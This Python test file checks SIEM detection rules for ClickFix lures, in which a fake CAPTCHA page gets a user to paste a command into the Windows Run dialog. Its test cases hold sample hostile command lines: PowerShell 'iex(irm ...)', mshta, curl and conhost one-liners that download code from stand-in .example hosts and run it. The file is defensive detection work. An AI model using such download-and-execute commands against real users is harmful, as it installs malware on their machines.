# tests/worker/test_clickfix_rules.py
"""ClickFix: a fake CAPTCHA / "fix it" page puts a command on the clipboard
and has the user paste it into Win+R. The process rule fires on Explorer
starting a shell with a download or decode in its command line, the RunMRU
rule on the command Windows records for the Run dialog; both stay quiet on
the same programs started normally. Lines as the agent's ETW sensor
(agent/internal/winsensor) writes them, and Sysmon's."""
import asyncio
import glob
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../worker"))

import pytest

from worker.decoder_engine import DecoderEngine
from worker.sigma_engine import SigmaEngine

ROOT = os.path.join(os.path.dirname(__file__), "../..")
PROC = "ClickFix Command Pasted Into The Run Dialog"
MRU = "Suspicious Command Typed Into The Run Dialog"
SYS = "C:\\Windows\\System32"
PS = f"{SYS}\\WindowsPowerShell\\v1.0\\powershell.exe"
EXPLORER = "C:\\Windows\\explorer.exe"
RUNMRU = "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\"


def _load(pattern):
    return [open(p).read() for p in sorted(glob.glob(os.path.join(ROOT, pattern)))]


@pytest.fixture(scope="module")
def decoders():
    import yaml
    dec = DecoderEngine()
    dec.load_from_yaml_list(sorted(_load("decoders/*.yaml"), key=lambda c: yaml.safe_load(c).get("priority", 100)))
    return dec


@pytest.fixture(scope="module")
def rules():
    sig = SigmaEngine()
    sig.load_from_yaml_list(_load("rules/*.yaml"))
    assert not sig.load_errors, sig.load_errors
    return sig


def q(v):
    """winevent.Quote: a quote is written \\", a backslash doubled only before
    another backslash or a quote, or at the end (pasted commands keep quotes)."""
    out = []
    for i, c in enumerate(v):
        nxt = v[i + 1] if i + 1 < len(v) else None
        if c == "\\" and nxt in ("\\", '"', None):
            out.append("\\\\")
        elif c == '"':
            out.append('\\"')
        else:
            out.append(c)
    return '"' + "".join(out) + '"'


def proc(image, cmd, parent=EXPLORER):
    return (f'EventID=1 Channel="ETW" Provider="Microsoft-Windows-Kernel-Process" ProcessId="4321" '
            f'Image={q(image)} CommandLine={q(cmd)} User="WIN01\\alice" IntegrityLevel="Medium" '
            f'ParentProcessId="1000" ParentImage={q(parent)}')


def reg(value, details):
    return (f'EventID=13 Channel="ETW" Provider="SIEMAgent-Registry" EventType="SetValue" '
            f'TargetObject={q(RUNMRU + value)} Details={q(details)}')


CASES = [
    # the classic lure: hidden PowerShell fetching and running a script, with the fake check text
    ("windows_etw_process", proc(PS, "powershell -w h -c \"iex(irm https://check-verify.example/s)\" "
                                     "# I am not a robot - reCAPTCHA Verification ID: 7781"), PROC),
    ("windows_etw_process", proc(f"{SYS}\\mshta.exe", "mshta https://cdn-captcha.example/verify.hta"), PROC),
    ("windows_etw_process", proc(PS, "powershell -enc SQBFAFgAIAAoAGkAdwByACkA"), PROC),
    ("windows_etw_process", proc(f"{SYS}\\cmd.exe", "cmd /c curl -s https://x.example/a.bat -o %TEMP%\\a.bat && %TEMP%\\a.bat"),
     PROC),
    ("windows_etw_process", proc(f"{SYS}\\conhost.exe", "conhost.exe --headless powershell iwr https://x.example/p|iex"),
     PROC),
    ("windows_etw_process", proc(PS, "powershell # Cloudflare Ray ID: 8f2a - I am human"), PROC),
    # PowerShell or cmd opened from the Start menu or Win+R with nothing pasted
    ("windows_etw_process", proc(PS, "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\""), None),
    ("windows_etw_process", proc(f"{SYS}\\cmd.exe", "\"C:\\Windows\\system32\\cmd.exe\""), None),
    # a double-clicked local .hta has no URL
    ("windows_etw_process", proc(f"{SYS}\\mshta.exe", "\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Tools\\setup.hta\""),
     None),
    # the same download from a script or scheduled task, not the Run dialog: other rules' business
    ("windows_etw_process", proc(PS, "powershell iwr https://x.example/p|iex", parent=f"{SYS}\\svchost.exe"), None),
    # RunMRU: Windows appends \1 to each entry
    ("windows_etw_registry", reg("a", "powershell -w h -c \"iex(irm https://check-verify.example/s)\"\\1"), MRU),
    ("windows_etw_registry", reg("b", "mshta https://cdn-captcha.example/verify.hta\\1"), MRU),
    ("windows_etw_registry", reg("c", "cmd /c echo ✅ I am not a robot - Verification ID: 4412\\1"), MRU),
    ("windows_etw_registry", reg("d", "notepad\\1"), None),
    ("windows_etw_registry", reg("e", "\\\\fileserver\\share\\1"), None),
    ("windows_etw_registry", reg("MRUList", "edcba"), None),
]

TITLES = {PROC, MRU}


def _titles(decoders, rules, log_type, line):
    event, _ = decoders.decode_named(log_type, line)
    view = dict(event, raw_message=line, log_type=log_type, hostname="win01")
    return {m["title"] for m in asyncio.run(rules.evaluate(view))} & TITLES


@pytest.mark.parametrize("log_type,line,title", CASES)
def test_etw_lines(decoders, rules, log_type, line, title):
    assert _titles(decoders, rules, log_type, line) == ({title} if title else set())


@pytest.mark.parametrize("log_type,line,title", CASES)
def test_same_lines_from_sysmon(decoders, rules, log_type, line, title):
    sysmon = line.replace('Channel="ETW"', 'Channel="Microsoft-Windows-Sysmon/Operational"')
    assert _titles(decoders, rules, "windows_sysmon", sysmon) == ({title} if title else set())


def test_every_rule_has_a_positive_case():
    assert {t for _, _, t in CASES if t} == TITLES
